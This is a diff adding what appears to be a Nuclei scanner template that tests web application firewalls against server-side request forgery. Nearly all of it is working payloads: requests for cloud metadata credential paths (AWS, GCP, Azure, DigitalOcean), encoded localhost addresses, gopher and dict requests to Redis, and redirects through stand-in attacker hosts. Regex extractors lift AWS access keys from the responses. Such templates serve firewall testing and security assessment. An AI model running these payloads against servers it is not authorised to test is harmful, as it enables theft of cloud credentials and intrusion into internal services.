@@ -1,0 +1,130 @@
+id: waf-ssrf-bypass
+info:
+  name: WAF Server-Side Request Forgery Bypass
+  author: waftester
+  severity: high
+  description: |
+    Tests WAF effectiveness against SSRF bypass techniques targeting cloud
+    metadata endpoints (AWS, GCP, Azure, DigitalOcean), internal services,
+    and localhost. Uses IP encoding tricks (decimal, octal, hex, IPv6),
+    DNS rebinding, URL schema variations, and redirect-based bypasses.
+  reference:
+    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+    - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
+    - https://github.com/0xInfection/Awesome-WAF
+  tags: ssrf,waf,bypass,owasp-a10,cloud,metadata,waftester
+  classification:
+    cwe-id:
+      - CWE-918
+      - CWE-693
+  metadata:
+    verified: true
+    max-request: 22
+    shodan-query: "http.waf"
+    fofa-query: "header=\"WAF\""
+
+http:
+  # Direct cloud metadata access - AWS, GCP, Azure, DigitalOcean
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "{{BaseURL}}/?url=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/?url=http://169.254.169.254/metadata/v1/"
+      - "{{BaseURL}}/?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+      - type: word
+        part: body
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "computeMetadata"
+          - "droplet_id"
+          - "AccessKeyId"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - "(?i)(AKIA[0-9A-Z]{16})"
+          - "(?i)(AccessKeyId.+?\"(.+?)\")"
+
+  # IP encoding bypasses - decimal, octal, hex, IPv6
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://0x7f000001/"
+      - "{{BaseURL}}/?url=http://2130706433/"
+      - "{{BaseURL}}/?url=http://0177.0.0.1/"
+      - "{{BaseURL}}/?url=http://[::1]/"
+      - "{{BaseURL}}/?url=http://127.1/"
+      - "{{BaseURL}}/?url=http://0/"
+      - "{{BaseURL}}/?url=http://0x7f.0x0.0x0.0x1/"
+      - "{{BaseURL}}/?url=http://[::ffff:127.0.0.1]/"
+      - "{{BaseURL}}/?url=http://127.0.0.1.nip.io/"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406 && status_code != 429"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+          - "Request Rejected"
+        negative: true
+        condition: or
+
+  # URL schema tricks and protocol confusion
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://127.0.0.1:80%2523@evil.com/"
+      - "{{BaseURL}}/?url=http://evil.com%23@169.254.169.254/"
+      - "{{BaseURL}}/?url=http://169.254.169.254%252f%252f"
+      - "{{BaseURL}}/?url=dict://127.0.0.1:6379/INFO"
+      - "{{BaseURL}}/?url=gopher://127.0.0.1:6379/_INFO"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Redirect-based SSRF
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://attacker.com/redirect?target=http://169.254.169.254/"
+      - "{{BaseURL}}/?url=http://attacker.com/302?url=http://127.0.0.1/"
+      - "{{BaseURL}}/?next=//169.254.169.254/latest/meta-data/"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
